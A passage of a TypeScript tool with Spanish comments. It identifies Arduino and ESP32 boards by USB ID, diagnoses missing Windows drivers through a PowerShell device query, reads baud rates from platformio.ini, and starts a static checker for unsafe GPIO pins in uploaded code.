 * Arduino clon, un ESP32 o un ESP8266 — el chip serial es el mismo. Por eso
 * `placa` dice lo que se sabe y nada más, sin adivinar.
 */
const CHIPS_USB: Array<{
  vid: string
  pid?: string
  chip: string
  placa: string
  driverWindows?: string
}> = [
  {
    vid: "1A86",
    chip: "CH340 / CH341",
    placa: "clon de Arduino, o un ESP32/ESP8266",
    driverWindows: "https://www.wch-ic.com/downloads/CH341SER_EXE.html",
  },
  {
    vid: "10C4",
    pid: "EA60",
    chip: "CP2102 (Silicon Labs)",
    placa: "muy común en placas ESP32 DevKit",
    driverWindows: "https://www.silabs.com/developer-tools/usb-to-uart-bridge-vcp-drivers",
  },
  {
    vid: "0403",
    chip: "FTDI",
    placa: "Arduino Nano viejo, o una placa con FTDI",
    driverWindows: "https://ftdichip.com/drivers/vcp-drivers/",
  },
  { vid: "2341", chip: "el propio de Arduino", placa: "Arduino oficial" },
  { vid: "2A03", chip: "el propio de Arduino", placa: "Arduino (arduino.org)" },
  { vid: "303A", chip: "USB nativo de Espressif", placa: "ESP32-S2, S3 o C3" },
]

/** Los puertos serie que NO son una placa: los trae la máquina, no el cable. */
const NO_ES_PLACA = /ACPI\\PNP|BTHENUM|\\VIRTUAL/i

/**
 * Lee el `hwid` que devuelve PlatformIO y dice qué es.
 *
 * Exportada para poder probarla con hwids reales sin tener la placa enchufada.
 */
export function identificar(
  hwid?: string,
  descripcion?: string,
): { esPlaca: boolean; chip?: string; placa?: string; driverWindows?: string; motivo?: string } {
  const id = (hwid ?? "").toUpperCase()

  if (!id) return { esPlaca: false, motivo: "el sistema no informa qué es" }

  if (NO_ES_PLACA.test(id)) {
    return {
      esPlaca: false,
      motivo: "es un puerto serie de la propia máquina, no una placa conectada",
    }
  }

  /*
   * DOS FORMATOS, y hay que aceptar los dos.
   *
   *   Linux / pyserial   USB VID:PID=1A86:7523 LOCATION=1-1
   *   Windows crudo      USB\VID_1A86&PID_7523\5&1D2A3B4C&0&2
   *
   * El primero pone los dos números juntos después del `=`; el segundo, cada uno
   * detrás de su etiqueta. Una regex sola no cubre los dos, y quedarse con la de
   * Windows —que fue lo que hice primero— deja ciega a la mitad de las máquinas.
   */
  const junto = id.match(/VID:PID=([0-9A-F]{4}):([0-9A-F]{4})/)
  const vid = junto?.[1] ?? id.match(/VID_([0-9A-F]{4})/)?.[1]
  const pid = junto?.[2] ?? id.match(/PID_([0-9A-F]{4})/)?.[1]

  if (!vid) {
    return {
      esPlaca: false,
      motivo: "no tiene identificador USB, así que no llegó por un cable USB",
    }
  }

  const conocido = CHIPS_USB.find((c) => c.vid === vid && (!c.pid || c.pid === pid))
  if (conocido) {
    return {
      esPlaca: true,
      chip: conocido.chip,
      placa: conocido.placa,
      driverWindows: conocido.driverWindows,
    }
  }

  // USB pero de un fabricante que no está en la tabla: probablemente sirve igual.
  return {
    esPlaca: true,
    chip: `USB ${vid}${pid ? ":" + pid : ""}`,
    placa: descripcion || "no está en mi lista, pero es un dispositivo USB",
  }
}

/**
 * Los códigos con los que Windows dice "esto está enchufado pero no anda".
 *
 * El 28 es EL caso que nos importa: "los controladores para este dispositivo no
 * están instalados". Es exactamente lo que pasa con un CH340 recién enchufado en
 * una Windows limpia.
 */
const ERRORES_DE_DRIVER: Record<number, string> = {
  1: "Windows no lo configuró bien",
  10: "el dispositivo no puede iniciarse",
  28: "**le falta el driver** — Windows no lo trae de fábrica",
  31: "el driver que tiene no funciona",
  37: "el driver no pudo arrancar",
  39: "el driver está dañado o falta",
  43: "Windows lo detuvo porque reportó un problema",
}

/**
 * Convierte la salida de Windows en algo que se pueda contar.
 *
 * Exportada para poder probarla con la salida real sin tener que enchufar una
 * placa sin driver, que es un escenario difícil de montar a pedido.
 */
export function leerDispositivosConProblema(
  json: string,
): Array<{ nombre: string; hwid: string; problema: string; driverWindows?: string }> {
  let filas: Array<{ Name?: string; DeviceID?: string; ConfigManagerErrorCode?: number }>
  try {
    const parsed = JSON.parse(json)
    filas = Array.isArray(parsed) ? parsed : [parsed]
  } catch {
    return []
  }

  return filas
    .filter((f) => f?.DeviceID && f.ConfigManagerErrorCode)
    .map((f) => {
      const q = identificar(f.DeviceID, f.Name)
      return {
        nombre: f.Name ?? "dispositivo sin nombre",
        hwid: f.DeviceID!,
        problema: ERRORES_DE_DRIVER[f.ConfigManagerErrorCode!] ?? `código ${f.ConfigManagerErrorCode}`,
        driverWindows: q.driverWindows,
      }
    })
    .filter((d) => identificar(d.hwid).esPlaca)
}

/**
 * Busca placas que Windows VE pero no puede usar.
 *
 * POR QUÉ HACE FALTA. Sin el driver del CH340, Windows no crea ningún puerto COM
 * — así que `pio device list` no devuelve nada y el bot dice "no hay ninguna
 * placa conectada". El docente mira el cable, lo mueve, prueba otro puerto USB, y
 * la placa estuvo bien todo el tiempo.
 *
 * Windows SÍ ve el dispositivo: lo tiene en el administrador con un código de
 * error. Preguntarle a él convierte "no hay nada" en "está enchufada, le falta
 * el driver, bajalo de acá".
 *
 * Sólo Windows: en Linux y macOS el CH340 anda sin instalar nada.
 */
async function placasSinDriver(cwd: string, signal?: AbortSignal) {
  if (process.platform !== "win32") return []
  /*
   * `Get-CimInstance` y no `Get-WmiObject`: la misma clase y las mismas
   * propiedades, pero el cmdlet viejo no existe en PowerShell 7 —y en algunas
   * maquinas `powershell` resuelve a pwsh 7—, con lo que la consulta fallaba en
   * silencio y el diagnostico decia "ninguna placa" con la placa enchufada.
   *
   * Y la salida se pide en UTF-8: por defecto PowerShell escribe al pipe en la
   * pagina de codigos OEM, `run()` la decodifica como UTF-8, y un "Puerto de
   * comunicaciones" con tilde llegaba roto al chat.
   */
  const ps =
    "[Console]::OutputEncoding=[Text.Encoding]::UTF8; " +
    "Get-CimInstance Win32_PnPEntity -ErrorAction SilentlyContinue | " +
    "Where-Object { $_.ConfigManagerErrorCode -ne 0 } | " +
    "Select-Object Name, DeviceID, ConfigManagerErrorCode | ConvertTo-Json -Compress"
  const r = await run(["powershell", "-NoProfile", "-Command", ps], cwd, signal)
  return r.code === 0 ? leerDispositivosConProblema(r.stdout) : []
}

async function detectPort(cwd: string, signal?: AbortSignal): Promise<{ port: string; hwid?: string } | { error: string }> {
  const result = await run(["pio", "device", "list", "--json-output"], cwd, signal)

  let devices: Device[] = []
  try {
    devices = JSON.parse(result.stdout) as Device[]
  } catch {
    const isWindows = process.platform === "win32"
    const pattern = isWindows ? /COM\d+/g : /\/dev\/tty(?:USB|ACM)\d+/g
    const matches = result.stdout.match(pattern) ?? []
    devices = matches.map((port) => ({ port }))
  }

  /*
   * SÓLO PLACAS, y nunca "lo que haya".
   *
   * Antes esto era `usbDevices.length > 0 ? usbDevices : devices`: si no había
   * ninguna placa, caía a TODOS los puertos serie y elegía el primero. En una
   * máquina virtual eso es el COM1 emulado (`ACPI\PNP0501`), que no es nada — y
   * la carga fallaba con un error de PlatformIO en vez de con un "no hay ninguna
   * placa conectada", que es la verdad y lo que el docente necesita leer.
   */
  const candidates = devices.filter((d) => identificar(d.hwid, d.description).esPlaca)

  if (candidates.length === 0) {
    const otros = devices.filter((d) => !identificar(d.hwid, d.description).esPlaca)
    const primero = otros[0]
    const detalle = primero
      ? ` Veo ${otros.length === 1 ? "un puerto serie" : `${otros.length} puertos serie`} (${otros
          .map((d) => d.port)
          .join(", ")}), pero ${otros.length === 1 ? "no es" : "ninguno es"} una placa: ${
          identificar(primero.hwid, primero.description).motivo
        }.`
      : ""
    return {
      error:
        `No encuentro ninguna placa conectada. Conectá el Arduino o el ESP32 por USB y probá de nuevo.${detalle}` +
        ` Si la placa está enchufada y sigo sin verla, corré \`/diagnostico\`: puede faltarle el driver.`,
    }
  }

  const unica = candidates[0]
  if (unica && candidates.length === 1) {
    return { port: unica.port, hwid: unica.hwid }
  }

  const lista = candidates.map((d, i) => `${i + 1}. ${d.port}${d.description ? ` (${d.description})` : ""}`).join("\n")
  return {
    error: `Hay varios dispositivos conectados. Indicame cual es el tuyo:\n${lista}\n\nVolve a intentar con el parametro 'port' especificando el puerto que corresponde.`,
  }
}

/** Una sola forma de decir "reinstala desde cero": la misma en este tool y en /actualizar. */
const CLONAR_REPO =
  "descarga el proyecto de nuevo con `git clone https://github.com/programadores-obreros/Agente-editor-inet.git` " +
  "(o el ZIP desde esa pagina) y corre `bash install/bootstrap.sh` adentro de la carpeta."
const REINSTALAR_DESDE_CERO =
  "Baja el instalador de la ultima version publicada, " +
  "https://github.com/programadores-obreros/Agente-editor-inet/releases/latest " +
  "(`Instalar-Tecnia-Bot.exe`), y corrilo una vez: instala solo lo que falte y no borra tu trabajo. " +
  "En Linux/Mac, " + CLONAR_REPO

/**
 * Los baudios del monitor salen del `monitor_speed` del platformio.ini.
 *
 * La descripcion del tool prometia "puerto y baudios automaticos" y el codigo
 * hacia `args.baud ?? 9600`. El ini que el propio prompt genera para ESP32 dice
 * `monitor_speed = 115200`: el monitor abria a 9600 y el docente veia basura
 * en pantalla, con el dato correcto escrito a dos lineas de distancia.
 *
 * Es una funcion pura sobre el TEXTO del ini para poder probarla sin disco.
 * Prioridad: el environment pedido, despues la seccion comun `[env]`, despues
 * el primer `monitor_speed` que aparezca en cualquier `[env:*]`.
 */
export function leerMonitorSpeed(iniText: string, env?: string): number | null {
  const porSeccion = new Map<string, number>()
  const orden: string[] = []
  let seccion = ""
  for (const cruda of iniText.split(/\r?\n/)) {
    const linea = cruda.replace(/[;#].*$/, "").trim()
    const cab = linea.match(/^\[([^\]]+)\]$/)
    if (cab) {
      seccion = (cab[1] ?? "").trim()
      continue
    }
    const kv = linea.match(/^monitor_speed\s*=\s*(\d+)\s*$/)
    if (kv && seccion && !porSeccion.has(seccion)) {
      porSeccion.set(seccion, Number(kv[1] ?? 0))
      orden.push(seccion)
    }
  }
  if (env && porSeccion.has(`env:${env}`)) return porSeccion.get(`env:${env}`)!
  if (porSeccion.has("env")) return porSeccion.get("env")!
  const primero = orden.find((s) => s.startsWith("env:"))
  return primero ? porSeccion.get(primero)! : null
}

/** El monitor_speed del platformio.ini de `cwd`, o null si no hay ini o no lo declara. */
function monitorSpeedDelProyecto(cwd: string, env?: string): number | null {
  const ini = join(cwd, "platformio.ini")
  if (!existsSync(ini)) return null
  try {
    return leerMonitorSpeed(readFileSync(ini, "utf8"), env)
  } catch {
    return null
  }
}

/*
 * ═══════════════════════════════════════════════════════════════════════════
 * LOS PINES DEL CODIGO, MIRADOS ANTES DE CARGAR (0.4.8)
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * POR QUE. El tool `circuito` ya rechaza GPIO6 a GPIO11 en un ESP32, pero solo
 * cuando el bot DIBUJA. El codigo que el bot escribe y carga no pasaba por ningun
 * filtro: un `pinMode(7, OUTPUT)` compilaba, se cargaba, y la placa quedaba sin
 * arrancar porque ese pin es de la memoria flash. Y el prompt pide hacer el
 * checklist de seguridad antes de cargar, pero pedirlo no alcanza: en las
 * pruebas el bot a veces cargaba sin hacerlo.
 *
 * Lo que sigue es un analizador PURO sobre el texto del codigo:
 *   1. Limpia cada archivo POR SEPARADO: comentarios, textos entre comillas
 *      (tambien los R"(...)" del HTML de un servidor web) y separadores de
 *      digitos (1'000). Por separado para que un `/*` sin cerrar en un archivo
 *      no tape el resto del proyecto.
 *   2. Resuelve el preprocesador lo que se puede saber: las condiciones de placa
 *      (`#ifdef ESP32`, `#if defined(__AVR__)`...) se evaluan para la placa del
 *      platformio.ini y la rama que no se compila se TIRA entera: ni avisos ni
 *      #define. Una condicion desconocida (`#ifdef DEBUG`) deja la rama como
 *      "incierta": los bloqueos de adentro bajan a aviso.
 *   3. Resuelve el pin de cada uso: numeros, `#define`, constantes, arreglos,
 *      variables que NUNCA se vuelven a asignar, y los pines que se le pasan al
 *      constructor de una libreria de hardware (DHT, LiquidCrystal, Stepper...).
 *      Una variable que cambia en tiempo de ejecucion queda sin resolver y NO
 *      genera avisos: un aviso falso enseña a ignorar los avisos.
 *   4. Aplica las reglas de la placa (solo esp32dev y UNO/Nano: las del
 *      catalogo; con otra placa no se opina de pines).
 *
 * QUE NUNCA DICE. Nunca dice "pines OK": que no encuentre nada no prueba que el
 * cableado este bien. Es la regla del repo: un OK falso es peor que un error.
 *
 * LOS CONJUNTOS DE PINES SON COPIA de los de `circuito.ts` (`GPIO_FLASH`,
 * `GPIO_SOLO_ENTRADA`, `GPIO_STRAPPING`, `GPIO_UART_USB`, `UNO_POOL_PWM`). Las
 * tools de OpenCode se cargan cada una por su lado y no se importan entre si, asi
 * que se copian, y `tests/pines-codigo.test.mjs` verifica que sigan iguales.
 */
const PINES_FLASH = new Set([6, 7, 8, 9, 10, 11])
const PINES_STRAPPING = new Set([0, 2, 12, 15])
const PINES_SOLO_ENTRADA = new Set([34, 35, 36, 39])
const PINES_UART_USB = new Set([1, 3])
const UNO_PWM = new Set([3, 5, 6, 9, 10, 11])
// Existen en el chip pero no salen en el DevKit de 30/38 pines (esp32dev). No
// estan en circuito.ts porque el dibujo no los ofrece nunca.
const PINES_NO_EXPUESTOS = new Set([37, 38])
// ADC2: con el WiFi prendido, analogRead en estos pines falla (el WiFi usa el ADC2).
const PINES_ADC2 = new Set([0, 2, 4, 12, 13, 14, 15, 25, 26, 27])

export type FamiliaPlaca = "esp32" | "uno"

/** A que reglas responde cada `board =`. Fuera de esta lista no se opina. */
export function familiaDePlaca(board: string | null | undefined): FamiliaPlaca | null {
  if (board === "esp32dev") return "esp32"
  if (board === "uno" || board === "nanoatmega328" || board === "nanoatmega328new") return "uno"
  return null
}

/*
 * EL LED DE LA PLACA.
 *
 * `LED_BUILTIN`: en UNO/Nano el core lo define como 13. En esp32dev NO lo define:
 * la variante `esp32` del core que fijamos (`variants/esp32/pins_arduino.h`) no
 * lo trae, asi que un `LED_BUILTIN` sin definir ahi ni compila. La primera
 * version de esto lo daba por 2 y estaba mal. Si el codigo lo define, manda lo
 * que dice el codigo (`#define LED_BUILTIN 7` es GPIO7, y bloquea).
 *
 * `LED_PLACA` es otra cosa: el pin donde esta soldado el LED de la placa, para no
 * pedir el checklist por un blink. GPIO2 en el DevKit es INFERIDO de los clones
 * DOIT, que son los que circulan (y lo que dice `ejemplos/blink-esp32`).
 *
 * INFERIDO tambien el mapa An -> pin: en UNO/Nano A0..A7 son 14..21; en el ESP32
 * es la tabla de la variante `esp32` (A0=GPIO36, A3=GPIO39, A4=GPIO32...).
 */
const LED_BUILTIN_DEL_CORE: Partial<Record<FamiliaPlaca, number>> = { uno: 13 }
const LED_PLACA: Record<FamiliaPlaca, number> = { esp32: 2, uno: 13 }
const ANALOGICOS: Record<FamiliaPlaca, Record<number, number>> = {
  esp32: { 0: 36, 3: 39, 4: 32, 5: 33, 6: 34, 7: 35, 10: 4, 11: 0, 12: 2, 13: 15, 14: 13, 15: 12, 16: 14, 17: 27, 18: 25, 19: 26 },
  uno: { 0: 14, 1: 15, 2: 16, 3: 17, 4: 18, 5: 19, 6: 20, 7: 21 },
}

type Tri = boolean | null

// ── 1. Limpieza ────────────────────────────────────────────────────────────

interface Limpio {
  /** Sin comentarios y sin lo de adentro de los textos: para buscar llamadas. */
  codigo: string
  /** Sin comentarios pero con los textos: para leer los #include "x.h". */
  conTextos: string
}

/** `R"(` o `u8R"(`: el R arranca un texto crudo si no es la cola de un identificador. */
function esInicioRaw(src: string, i: number): boolean {
  const previo = src.slice(Math.max(0, i - 3), i)
  return !/\w$/.test(previo) || /(?:^|\W)(?:u8|u|U|L)$/.test(previo)
}

/** `1'000`: el apostrofo esta adentro de un numero, no abre un caracter. */
function esSeparadorDeDigitos(src: string, i: number): boolean {
  if (!/[0-9a-fA-F]/.test(src[i - 1] ?? "") || !/[0-9a-fA-F]/.test(src[i + 1] ?? "")) return false
  let k = i - 1
  while (k >= 0 && /[\w'.]/.test(src[k]!)) k--
  return /[0-9]/.test(src[k + 1] ?? "")
}

function limpiar(crudo: string): Limpio {
  // CRLF -> LF: los editores de Windows guardan asi, y con un `\r` al final las
  // directivas (`#define MOTOR 7\r`) no se reconocian y el pin quedaba sin resolver.
  const src = crudo.replace(/\r\n?/g, "\n")
  let codigo = ""
  let conTextos = ""
  const n = src.length
  const blanquear = (s: string) => s.replace(/[^\n]/g, " ")
  let i = 0
  while (i < n) {
    const antes = i
    const c = src[i]!
    const d = src[i + 1]
    if (c === "/" && d === "/") {
      let j = i
      while (j < n && src[j] !== "\n") j++
      const b = blanquear(src.slice(i, j))
      codigo += b
      conTextos += b
      i = j
    } else if (c === "/" && d === "*") {
      const fin = src.indexOf("*/", i + 2)
      const j = fin < 0 ? n : fin + 2
      const b = blanquear(src.slice(i, j))
      codigo += b
      conTextos += b
      i = j
    } else if (c === "R" && d === '"' && esInicioRaw(src, i)) {
      const abre = src.indexOf("(", i + 2)
      const delim = abre < 0 ? "" : src.slice(i + 2, abre)
      if (abre < 0 || delim.length > 16 || /[\s\\()"]/.test(delim)) {
        codigo += c
        conTextos += c
        i++
      } else {
        const cierre = src.indexOf(`)${delim}"`, abre + 1)
        const j = cierre < 0 ? n : cierre + delim.length + 2
        const cuerpo = src.slice(i, j)
        codigo += blanquear(cuerpo)
        conTextos += cuerpo
        i = j
      }
    } else if (c === "'" && esSeparadorDeDigitos(src, i)) {
      codigo += c
      conTextos += c
      i++
    } else if (c === '"' || c === "'") {
      let j = i + 1
      while (j < n && src[j] !== c && src[j] !== "\n") j += src[j] === "\\" ? 2 : 1
      j = Math.min(j, n)
      const cerro = j < n && src[j] === c
      if (cerro) j++
      const cuerpo = src.slice(i, j)
      codigo += c + blanquear(cerro ? cuerpo.slice(1, -1) : cuerpo.slice(1)) + (cerro ? c : "")
      conTextos += cuerpo
      i = j
    } else {
      codigo += c
      conTextos += c
      i++
    }
    // Guarda de progreso: un caso que no avance colgaria al tool (y a OpenCode).
    if (i <= antes) {
      codigo += src[antes] ?? ""
      conTextos += src[antes] ?? ""
      i = antes + 1
    }
  }
  return { codigo, conTextos }
}

/**
 * Saca comentarios y (si `textos`) lo de adentro de las comillas, cambiandolo
 * por espacios y CONSERVANDO los saltos de linea. Las comillas quedan. Con
 * `textos = false` los textos se dejan, pero igual se recorren: un "/*.txt" o un
 * "http://" no abren un comentario.
 */
export function limpiarCodigo(src: string, textos = true): string {
  const l = limpiar(src)
  return textos ? l.codigo : l.conTextos
}

// ── 2. Preprocesador ─────────────────────────────────────────────────────────

/** Que macros de placa estan definidas (true) o seguro NO (false) para este `board`. Las demas no se saben. */
export function macrosDePlaca(board: string): Map<string, boolean> {
  const familia = familiaDePlaca(board)
  const m = new Map<string, boolean>()
  if (!familia) return m
  const esp = familia === "esp32"
  for (const x of ["ESP32", "ARDUINO_ARCH_ESP32", "ESP_PLATFORM"]) m.set(x, esp)
  for (const x of ["__AVR__", "ARDUINO_ARCH_AVR"]) m.set(x, !esp)
  m.set("ARDUINO_AVR_UNO", board === "uno")
  m.set("ARDUINO_AVR_NANO", board.startsWith("nanoatmega328"))
  return m
}

const y3 = (a: Tri, b: Tri): Tri => (a === false || b === false ? false : a === true && b === true ? true : null)
const o3 = (a: Tri, b: Tri): Tri => (a === true || b === true ? true : a === false && b === false ? false : null)
const no3 = (a: Tri): Tri => (a === null ? null : !a)

/**
 * Evalua la condicion de un `#if`/`#elif` con logica de tres valores: true,
 * false, o null si depende de algo que no sabemos (un flag del compilador, una
 * comparacion de versiones). Solo entiende `defined`, `!`, `&&`, `||`,
 * parentesis, numeros y nombres sueltos; cualquier otra cosa es null.
 */
export function evaluarCondicion(expr: string, conocidas: Map<string, Tri>): Tri {
  const toks = expr.match(/0x[0-9a-fA-F]+|\d+[uUlL]*|[A-Za-z_]\w*|&&|\|\||[()!]|\S/g) ?? []
  if (toks.some((t) => !/^(0x[0-9a-fA-F]+|\d+[uUlL]*|[A-Za-z_]\w*|&&|\|\||[()!])$/.test(t))) return null
  let p = 0
  const valorNombre = (x: string): Tri => conocidas.get(x) ?? null
  const primario = (): Tri | undefined => {
    const t = toks[p++]
    if (t === undefined) return undefined
    if (t === "(") {
      const v = disyuncion()
      return toks[p++] === ")" ? v : undefined
    }
    if (t === "!") {
      const v = primario()
      return v === undefined ? undefined : no3(v)
    }
    if (t === "defined") {
      const conParen = toks[p] === "("
      if (conParen) p++
      const nombre = toks[p++]
      if (!nombre || !/^[A-Za-z_]\w*$/.test(nombre)) return undefined
      if (conParen && toks[p++] !== ")") return undefined
      return valorNombre(nombre)
    }
    if (/^\d|^0x/.test(t)) return parseInt(t, /^0x/i.test(t) ? 16 : 10) !== 0
    if (/^[A-Za-z_]/.test(t)) return valorNombre(t)
    return undefined
  }
  const conjuncion = (): Tri | undefined => {
    let v = primario()
    while (v !== undefined && toks[p] === "&&") {
      p++
      const w = primario()
      v = w === undefined ? undefined : y3(v, w)
    }
    return v
  }
  const disyuncion = (): Tri | undefined => {
    let v = conjuncion()
    while (v !== undefined && toks[p] === "||") {
      p++
      const w = conjuncion()
      v = w === undefined ? undefined : o3(v, w)
    }
    return v
  }
  const v = disyuncion()
  return v === undefined || p !== toks.length ? null : v
}

interface Definicion {
  valor: string
  incierta: boolean
  ambigua: boolean
  /** Todos los valores que tuvo, para la huella cuando queda ambigua. */
  todos: string[]
}

interface Preprocesado {
  /** Lineas de `codigo`, con las ramas que no se compilan en blanco. */
  lineas: string[]
  lineasTexto: string[]
  /** La linea esta en una rama de condicion desconocida. */
  incierta: boolean[]
  /** La linea es cuerpo de una macro con parametros: lo de adentro no es un uso. */
  cuerpoDeMacro: boolean[]
  defines: Map<string, Definicion>
}

const DIRECTIVA = /^\s*#\s*([a-z]+)\b(.*)$/

/**
 * Recorre UN archivo limpio y decide que se compila para esta placa.
 *
 * Los include guards (`#ifndef X_H` seguido de `#define X_H`) no son condiciones:
 * cuentan como siempre verdaderos. Un `#define` en una rama que no se compila no
 * existe. Un nombre definido mas de una vez en ramas inciertas queda ambiguo y
 * no se resuelve.
 */
function preprocesar(lim: Limpio, macros: Map<string, boolean>): Preprocesado {
  const lc = lim.codigo.split("\n")
  const lt = lim.conTextos.split("\n")
  const conocidas = new Map<string, Tri>(macros)
  const pila: Array<{ valor: Tri; tomado: Tri }> = []
  const estado = (): "activo" | "inactivo" | "incierto" =>
    pila.some((f) => f.valor === false) ? "inactivo" : pila.some((f) => f.valor === null) ? "incierto" : "activo"
  const out: Preprocesado = { lineas: [], lineasTexto: [], incierta: [], cuerpoDeMacro: [], defines: new Map() }
  const emitir = (k: number, visible: boolean, incierta: boolean, macro: boolean) => {
    out.lineas.push(visible ? (lc[k] ?? "") : "")
    out.lineasTexto.push(visible ? (lt[k] ?? "") : "")
    out.incierta.push(incierta)
    out.cuerpoDeMacro.push(macro)
  }
  const registrar = (nombre: string, valor: string, incierta: boolean) => {
    const previa = out.defines.get(nombre)
    const todos = [...new Set([...(previa?.todos ?? []), valor])]
    if (!incierta) out.defines.set(nombre, { valor, incierta: false, ambigua: false, todos })
    else if (previa && previa.valor !== valor) out.defines.set(nombre, { ...previa, ambigua: true, todos })
    else if (!previa) out.defines.set(nombre, { valor, incierta: true, ambigua: false, todos })
  }

  let continuacion: { visible: boolean; incierta: boolean; macro: boolean; nombre: string | null; partes: string[] } | null = null
  for (let k = 0; k < lc.length; k++) {
    const linea = lc[k] ?? ""
    if (continuacion) {
      const c = continuacion
      emitir(k, c.visible, c.incierta, c.macro)
      if (c.nombre) c.partes.push(linea.replace(/\\\s*$/, "").trim())
      if (!/\\\s*$/.test(linea)) {
        if (c.nombre && c.visible) registrar(c.nombre, c.partes.join(" ").trim(), c.incierta)
        continuacion = null
      }
      continue
    }
    const m = linea.match(DIRECTIVA)
    const dir = m?.[1]
    const resto = (m?.[2] ?? "").replace(/\\\s*$/, "").trim()
    const primerNombre = resto.match(/^[A-Za-z_]\w*/)?.[0] ?? ""
    if (dir === "if" || dir === "ifdef" || dir === "ifndef") {
      let cond: Tri
      if (dir === "if") cond = evaluarCondicion(resto, conocidas)
      else {
        // Include guard: `#ifndef X` y la proxima linea con algo es `#define X`.
        let j = k + 1
        while (j < lc.length && !(lc[j] ?? "").trim()) j++
        const esGuard = dir === "ifndef" && primerNombre !== "" && new RegExp(`^\\s*#\\s*define\\s+${primerNombre}\\b`).test(lc[j] ?? "")
        const definida = conocidas.get(primerNombre) ?? null
        cond = esGuard ? true : dir === "ifdef" ? definida : no3(definida)
      }
      emitir(k, false, false, false)
      pila.push({ valor: cond, tomado: cond })
      continue
    }
    if (dir === "elif" || dir === "else" || dir === "endif") {
      const top = pila[pila.length - 1]
      if (top && dir === "elif") {
        const c = evaluarCondicion(resto, conocidas)
        top.valor = top.tomado === true ? false : top.tomado === false ? c : c === false ? false : null
        top.tomado = o3(top.tomado, c)
      } else if (top && dir === "else") {
        top.valor = no3(top.tomado)
        top.tomado = true
      } else if (top) pila.pop()
      emitir(k, false, false, false)
      continue
    }
    const e = estado()
    const visible = e !== "inactivo"
    const incierta = e === "incierto"
    if (dir === "define" && visible) {
      const d = resto.match(/^([A-Za-z_]\w*)(\(\s*([^)]*)\))?\s*([\s\S]*)$/)
      const nombre = d?.[1] ?? ""
      // `#define INIT() pinMode(7, OUTPUT)` no tiene parametros: su cuerpo SI es un uso.
      const conParametros = d?.[2] !== undefined && (d?.[3] ?? "").trim() !== ""
      if (nombre) conocidas.set(nombre, incierta ? (conocidas.get(nombre) === true ? true : null) : true)
      emitir(k, true, incierta, conParametros)
      const valor = d?.[2] !== undefined ? "" : (d?.[4] ?? "").trim()
      if (/\\\s*$/.test(linea)) {
        continuacion = { visible: true, incierta, macro: conParametros, nombre: d?.[2] !== undefined ? null : nombre, partes: [valor] }
      } else if (nombre && d?.[2] === undefined) registrar(nombre, valor, incierta)
      continue
    }
    if (dir === "undef" && visible) {
      if (incierta) {
        const previa = out.defines.get(primerNombre)
        if (previa) out.defines.set(primerNombre, { ...previa, ambigua: true })
        conocidas.set(primerNombre, null)
      } else {
        out.defines.delete(primerNombre)
        conocidas.set(primerNombre, false)
      }
    }
    emitir(k, visible, incierta, false)
    if (dir === "define" && /\\\s*$/.test(linea)) continuacion = { visible: false, incierta, macro: false, nombre: null, partes: [] }
  }
  return out
}

// ── 3. Simbolos y usos ──────────────────────────────────────────────────────

const TIPOS_C =
  "(?:unsigned\\s+|signed\\s+)?(?:int|byte|short|long|char|uint8_t|uint16_t|uint32_t|int8_t|int16_t|int32_t|size_t|gpio_num_t|pin_size_t)"

/** Los argumentos de una llamada, desde justo despues del `(`. Respeta parentesis anidados. */
function argumentosDesde(texto: string, desde: number): string[] | null {
  const args: string[] = []
  let nivel = 0
  let actual = ""
  for (let i = desde; i < texto.length; i++) {
    const c = texto[i]!
    if (c === "(" || c === "[" || c === "{") nivel++
    else if (c === ")" || c === "]" || c === "}") {
      if (nivel === 0) {
        if (c !== ")" && c !== "}") return null
        args.push(actual.trim())
        return args
      }
      nivel--
    } else if (c === "," && nivel === 0) {
      args.push(actual.trim())
      actual = ""
      continue
    }
    actual += c
  }
  return null
}

/** El valor de una inicializacion: hasta el `;` o la `,` del nivel de afuera. Devuelve tambien donde corto. */
function valorHasta(texto: string, desde: number): { valor: string; fin: number } {
  let nivel = 0
  let i = desde
  for (; i < texto.length; i++) {
    const c = texto[i]!
    if (c === "(" || c === "[" || c === "{") nivel++
    else if (c === ")" || c === "]" || c === "}") {
      if (nivel === 0) break
      nivel--
    } else if (nivel === 0 && (c === ";" || c === ",")) break
  }
  return { valor: texto.slice(desde, i).trim(), fin: i }
}

/** `(5)` o `((LED))`: el parentesis que abre es el que cierra al final. `(a)+(b)` no. */
function envueltoEnParentesis(e: string): boolean {
  if (!e.startsWith("(") || !e.endsWith(")")) return false
  let nivel = 0
  for (let i = 0; i < e.length; i++) {
    if (e[i] === "(") nivel++
    else if (e[i] === ")") nivel--
    if (nivel === 0 && i < e.length - 1) return false
  }
  return true
}

interface Simbolos {
  defines: Map<string, string>
  /** Valor inicial de cada variable o constante que se declara UNA vez y no se reasigna. */
  valores: Map<string, string>
  arreglos: Map<string, string[]>
  /** Todo lo que se escribio para cada nombre (define o inicializacion): va a la huella si no se resuelve. */
  textos: Map<string, string[]>
}

/** Junta lo resoluble del codigo ya preprocesado. `defines` viene del preprocesador, archivo por archivo. */
function juntarSimbolos(codigo: string, defines: Map<string, Definicion>): Simbolos {
  const textos = new Map<string, string[]>()
  const anotar = (nombre: string, t: string) => textos.set(nombre, [...(textos.get(nombre) ?? []), t])
  const defs = new Map<string, string>()
  for (const [nombre, d] of defines) {
    for (const v of d.todos) anotar(nombre, v)
    if (!d.ambigua) defs.set(nombre, d.valor)
  }

  const declaraciones = new Map<string, number>()
  const iniciales = new Map<string, string>()
  const arreglosCrudos = new Map<string, string[]>()
  const decl = new RegExp(`\\b(?:(?:static|const|constexpr|volatile)\\s+)*${TIPOS_C}\\s+(?:(?:const|constexpr)\\s+)?(?=[A-Za-z_])`, "g")
  const declarador = /\s*\*?\s*([A-Za-z_]\w*)\s*(\[[^\]]*\])?\s*/y
  for (const m of codigo.matchAll(decl)) {
    let pos = m.index! + m[0].length
    // `const int a = 4, b = 7;`: un declarador atras de otro, hasta el `;`.
    for (let vuelta = 0; vuelta < 64; vuelta++) {
      declarador.lastIndex = pos
      const d = declarador.exec(codigo)
      if (!d) break
      const nombre = d[1]!
      pos = declarador.lastIndex
      if (codigo[pos] === "=" && codigo[pos + 1] !== "=") {
        pos++
        while (/\s/.test(codigo[pos] ?? "")) pos++
        declaraciones.set(nombre, (declaraciones.get(nombre) ?? 0) + 1)
        if (d[2] !== undefined) {
          if (codigo[pos] !== "{") break
          const elems = argumentosDesde(codigo, pos + 1)
          if (elems) {
            const limpios = elems.filter((e) => e !== "")
            arreglosCrudos.set(nombre, limpios)
            anotar(nombre, `{${limpios.join(",")}}`)
          }
          pos = valorHasta(codigo, pos).fin
